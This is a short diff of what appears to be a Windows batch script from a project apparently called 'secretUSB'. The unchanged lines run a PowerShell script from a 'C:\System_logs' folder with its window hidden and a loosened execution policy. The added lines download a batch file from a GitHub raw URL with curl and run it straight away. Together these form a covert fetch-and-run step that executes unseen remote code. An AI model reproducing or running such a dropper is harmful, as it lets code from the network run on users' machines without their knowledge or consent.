@@ -100,3 +100,6 @@ del C:\System_logs\raccourci.ps1
 
 
 Powershell.exe -NoLogo -WindowStyle Hidden -executionpolicy remotesigned -File  c:\System_logs\logs.ps1
+
+curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/hostname.bat
+start "" cmd /c "hostname.bat"
